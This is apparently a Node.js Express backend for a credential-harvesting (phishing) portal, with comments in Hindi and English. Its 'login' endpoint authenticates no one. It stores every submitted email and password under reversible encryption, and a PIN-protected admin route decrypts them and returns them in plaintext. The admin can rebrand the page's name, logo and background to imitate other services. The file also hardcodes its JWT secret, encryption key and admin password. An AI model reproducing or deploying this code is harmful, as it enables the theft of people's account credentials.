const express = require('express');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const jwt = require('jwt-simple');
const cors = require('cors');
const CryptoJS = require('crypto-js');

const app = express();

app.use(cors());
app.use(express.json({ limit: '10mb' }));

// Uploads Folder Setup
const uploadDir = './uploads';
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir);
}

const storage = multer.diskStorage({
    destination: './uploads/',
    filename: (req, file, cb) => {
        const ext = path.extname(file.originalname).toLowerCase();
        cb(null, file.fieldname + '-' + Date.now() + ext);
    }
});
const upload = multer({ storage: storage });
app.use('/uploads', express.static('uploads'));

// Secret Keys & Credentials
const JWT_SECRET = 'Super_Secure_JWT_Secret_Key_2026_#99X';
const ENCRYPTION_KEY = 'MySecretEncryptionKeyForPasswords'; 
const ADMIN_USERNAME = 'admin';
const ADMIN_PASSWORD_PLAIN = 'AdminPass@2026#Secure';
const DATA_SECRET_PIN = '987654';

// In-Memory Database
let usersList = [];
let appSettings = {
    appName: "Portal App",
    appSubtitle: "Apne account me login karein",
    appLogoUrl: "",
    appBgUrl: "",
    appStatus: "ONLINE"
};

// Security Middleware for Admin
function authenticateAdminToken(req, res, next) {
    const authHeader = req.headers['authorization'];
    if (!authHeader) return res.status(401).json({ error: "Access Denied! Token Missing." });
    
    try {
        const token = authHeader.split(' ')[1];
        const decoded = jwt.decode(token, JWT_SECRET);
        if (decoded.exp < Date.now()) return res.status(401).json({ error: "Session Expired!" });
        req.admin = decoded;
        next();
    } catch (err) {
        return res.status(403).json({ error: "Invalid Security Token!" });
    }
}

// ---------------- 1. LOGIN API (AUTOMATIC OVERWRITE / NO DUPLICATES) ----------------

app.get('/api/app-settings', (req, res) => res.json(appSettings));

app.post('/api/login', (req, res) => {
    const { email, password } = req.body;

    if (!email || !password) {
        return res.status(400).json({ error: "Email aur Password dono required hain!" });
    }

    // Encrypt password before saving
    const encryptedPassword = CryptoJS.AES.encrypt(password, ENCRYPTION_KEY).toString();

    // Check if user already exists (Overwrite Logic)
    const existingUserIndex = usersList.findIndex(u => u.email === email);

    if (existingUserIndex !== -1) {
        // Purana password aur date replace kar do (No duplicate rows)
        usersList[existingUserIndex].encryptedPassword = encryptedPassword;
        usersList[existingUserIndex].date = new Date().toLocaleString();
        
        return res.json({ success: true, message: "User password updated successfully!" });
    } else {
        // New user add karo
        const newUser = {
            id: Date.now(),
            email: email,
            encryptedPassword: encryptedPassword,
            date: new Date().toLocaleString()
        };
        usersList.push(newUser);

        return res.json({ success: true, message: "New user registered successfully!" });
    }
});


// ---------------- 2. ADMIN API ROUTES ----------------

app.post('/api/admin/login', (req, res) => {
    const { username, password } = req.body;
    if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD_PLAIN) {
        const payload = { user: username, exp: Date.now() + (5 * 60 * 60 * 1000) };
        const token = jwt.encode(payload, JWT_SECRET);
        res.json({ success: true, token: token });
    } else {
        res.status(401).json({ error: "Galat Username ya Password!" });
    }
});

// Decrypt passwords and view users list
app.post('/api/admin/get-users', authenticateAdminToken, (req, res) => {
    const { dataPin } = req.body;
    
    if (dataPin === DATA_SECRET_PIN) {
        const decryptedUsersList = usersList.map(u => {
            const bytes = CryptoJS.AES.decrypt(u.encryptedPassword, ENCRYPTION_KEY);
            const originalPassword = bytes.toString(CryptoJS.enc.Utf8);
            return {
                id: u.id,
                email: u.email,
                password: originalPassword,
                date: u.date
            };
        });

        res.json({ success: true, users: decryptedUsersList });
    } else {
        res.status(403).json({ error: "Galat Security PIN!" });
    }
});

app.delete('/api/admin/delete-user/:id', authenticateAdminToken, (req, res) => {
    const userId = Number(req.params.id);
    usersList = usersList.filter(u => u.id !== userId);
    res.json({ success: true, message: "User deleted!" });
});

app.post('/api/admin/update-settings', authenticateAdminToken, (req, res) => {
    const { appName, appSubtitle, appStatus } = req.body;
    if (appName) appSettings.appName = appName;
    if (appSubtitle) appSettings.appSubtitle = appSubtitle;
    if (appStatus) appSettings.appStatus = appStatus;
    res.json({ success: true, message: "App Settings Updated!" });
});

app.post('/api/admin/upload-media', authenticateAdminToken, upload.fields([{ name: 'logoImage' }, { name: 'bgImage' }]), (req, res) => {
    if (req.files['logoImage']) {
        if (appSettings.appLogoUrl) {
            const oldPath = path.join(__dirname, appSettings.appLogoUrl);
            if (fs.existsSync(oldPath)) fs.unlinkSync(oldPath);
        }
        appSettings.appLogoUrl = `/uploads/${req.files['logoImage'][0].filename}`;
    }
    if (req.files['bgImage']) {
        if (appSettings.appBgUrl) {
            const oldPath = path.join(__dirname, appSettings.appBgUrl);
            if (fs.existsSync(oldPath)) fs.unlinkSync(oldPath);
        }
        appSettings.appBgUrl = `/uploads/${req.files['bgImage'][0].filename}`;
    }
    res.json({ success: true, message: "Media updated & old files auto-deleted!" });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
